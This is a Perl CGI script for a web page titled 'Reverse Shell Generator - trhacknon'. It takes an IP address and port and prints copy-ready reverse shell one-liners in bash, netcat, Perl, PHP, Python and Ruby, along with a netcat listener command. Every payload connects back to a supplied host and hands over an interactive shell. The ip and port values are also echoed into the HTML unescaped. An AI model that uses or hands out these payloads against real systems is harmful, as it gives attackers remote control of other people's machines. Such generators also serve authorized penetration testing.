#!/usr/bin/env perl
use strict;
use warnings;
use CGI;

my $q = CGI->new;
# print $q->header('text/html');
print $q->header(-type => 'text/html', -charset => 'UTF-8');

my $ip   = $q->param('ip')   || '127.0.0.1';
my $port = $q->param('port') || '4444';

my %payloads = (
    bash   => "bash -i >& /dev/tcp/$ip/$port 0>&1",
    nc     => "nc -e /bin/sh $ip $port",
    perl   => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"/bin/sh -i\");};'",
    php    => "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    python => "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"])'",
    ruby   => "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
);

print <<HTML;
<html>
<head>
    <meta charset="UTF-8">
    <title>Reverse Shell Generator - trhacknon</title>
    <style>
        body {
            background: #0a0a0a;
            color: #0ff;
            font-family: monospace;
            padding: 20px;
        }
        h1 {
            color: #f0f;
            font-size: 28px;
        }
        h3 {
            color: #ff0;
        }
        form {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="submit"] {
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 6px;
            margin: 5px;
        }
        input[type="submit"]:hover {
            background: #0f0;
            color: #000;
            cursor: pointer;
        }
        .payload {
            margin-top: 30px;
        }
        .payload blockquote {
            background: #111;
            border-left: 4px solid #0ff;
            padding: 10px;
            margin-bottom: 20px;
            position: relative;
        }
        .copy {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #0ff;
            color: #000;
            border: none;
            padding: 5px 10px;
            font-weight: bold;
            cursor: pointer;
        }
        .copy:hover {
            background: #fff;
            color: #111;
        }
        .copied {
            display: none;
            color: #0f0;
            font-size: small;
            margin-top: 5px;
        }
        pre {
            background: #111;
            padding: 10px;
            color: #0f0;
            border: 1px dashed #444;
        }
        code {
            color: #fff;
        }
    </style>
</head>
<body>
    <h1>Reverse Shell Generator - trhacknon</h1>
    <form method="GET">
        IP: <input type="text" name="ip" value="$ip" required>
        Port: <input type="text" name="port" value="$port" required>
        <input type="submit" value="Générer">
    </form>

    <div class="payload">
HTML

foreach my $lang (sort keys %payloads) {
    my $payload = $payloads{$lang};
    $payload =~ s/'/&#39;/g;
    print <<PAYLOAD;
        <h3>$lang</h3>
        <blockquote id="p_$lang">
            <code>$payload</code>
            <button class="copy" onclick="copyPayload('$lang')">Copier</button>
            <div class="copied" id="msg_$lang">Copié !</div>
        </blockquote>
PAYLOAD
}

print <<HTML;
    </div>

    <h3>Listener Netcat :</h3>
    <pre><code>nc -lvnp $port</code></pre>

    <script>
        function copyPayload(lang) {
            let text = document.getElementById('p_' + lang).innerText;
            navigator.clipboard.writeText(text).then(function() {
                document.getElementById('msg_' + lang).style.display = 'inline';
                setTimeout(() => {
                    document.getElementById('msg_' + lang).style.display = 'none';
                }, 2000);
            });
        }
    </script>
</body>
</html>
HTML
